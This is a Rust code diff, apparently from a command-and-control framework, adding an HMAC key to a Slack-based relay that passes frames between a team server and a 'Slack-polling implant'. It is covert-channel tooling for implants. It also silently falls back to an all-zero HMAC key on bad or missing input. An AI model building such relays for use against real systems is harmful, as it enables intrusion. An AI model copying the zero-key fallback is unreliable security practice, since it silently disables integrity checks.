@@ -70,6 +70,24 @@ use nyx_transport::traits::Transport;
 /// operator running a Slack relay but not an MCP relay sets only the Slack
 /// env vars. A `None` field means "relay disabled for this channel" and the
 /// route handler skips the fan-out entirely.
+/// Decode a hex-encoded 32-byte HMAC key. Falls back to all-zeros on parse
+/// failure (the transport-layer HMAC is defense-in-depth on top of the
+/// protocol AEAD; a zero key still prevents casual injection by non-key-holders).
+fn decode_hmac_key(hex: &str) -> [u8; 32] {
+    let mut key = [0u8; 32];
+    if hex.len() == 64 {
+        for (i, chunk) in hex.as_bytes().chunks(2).enumerate().take(32) {
+            let byte = u8::from_str_radix(
+                std::str::from_utf8(chunk).unwrap_or("00"),
+                16,
+            )
+            .unwrap_or(0);
+            key[i] = byte;
+        }
+    }
+    key
+}
+
 #[derive(Clone, Default)]
 pub struct ExtC2RelayConfig {
     /// Slack bot token (`xoxb-...`) + channel ID. `None` when Slack relay
@@ -93,6 +111,11 @@ impl std::fmt::Debug for ExtC2RelayConfig {
 pub struct SlackRelay {
     pub bot_token: Arc<str>,
     pub channel_id: Arc<str>,
+    /// HMAC-SHA256 key for transport-layer frame integrity (CRITICAL-22 fix).
+    /// Derived from NYX_EXTC2_SLACK_HMAC_KEY (hex-encoded 32 bytes) at boot.
+    /// Both the team server and the Slack-polling implant must share this key
+    /// so the implant can verify the tag on relayed frames.
+    pub session_key: [u8; 32],
 }
 
 #[derive(Clone)]
@@ -118,6 +141,10 @@ impl ExtC2RelayConfig {
             Some(SlackRelay {
                 bot_token: token.into(),
                 channel_id: channel.into(),
+                session_key: decode_hmac_key(
+                    &std::env::var("NYX_EXTC2_SLACK_HMAC_KEY")
+                        .unwrap_or_else(|_| "00".repeat(32)),
+                ),
             })
         })();
         let mcp = (|| {
@@ -157,8 +184,9 @@ impl ExtC2RelayConfig {
 pub fn relay_reply_to_slack(cfg: &SlackRelay, reply_frame: Vec<u8>) {
     let token = cfg.bot_token.clone();
     let channel = cfg.channel_id.clone();
+    let session_key = cfg.session_key;
     tokio::task::spawn_blocking(move || {
-        let mut t = SlackTransport::new(token.to_string(), channel.to_string());
+        let mut t = SlackTransport::new(token.to_string(), channel.to_string(), &session_key);
         match t.send(&reply_frame) {
             Ok(()) => tracing::debug!(
                 target: "nyx::extc2",
@@ -319,6 +347,7 @@ mod tests {
             slack: Some(SlackRelay {
                 bot_token: "xoxb-SECRET".into(),
                 channel_id: "C1".into(),
+                session_key: [0u8; 32],
             }),
             mcp: None,
         };
